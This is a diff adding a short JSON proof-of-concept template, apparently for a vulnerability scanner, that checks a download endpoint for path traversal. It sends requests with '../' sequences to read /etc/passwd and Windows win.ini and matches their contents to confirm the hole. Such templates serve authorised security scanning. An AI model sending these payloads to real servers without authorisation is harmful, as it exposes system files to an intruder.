@@ -1,0 +1,19 @@
+{
+  "pocId": "",
+  "information": {
+    "name": "",
+    "author": "",
+    "createTime": "",
+    "updateTime": ""
+  },
+  "http": [
+    {
+      "method": "GET",
+      "paty": [
+        "{{BaseURL}}/common/download/resource?resource=/profile/../../../../etc/passwd",
+        "{{BaseURL}}/common/download/resource?resource=/profile/../../../../Windows/win.ini"
+      ],
+      "verify": [{ "match": ["regex(body,root:.*:0:0)", "body('bit app support' and 'fonts' and 'extensions')"] }]
+    }
+  ]
+}
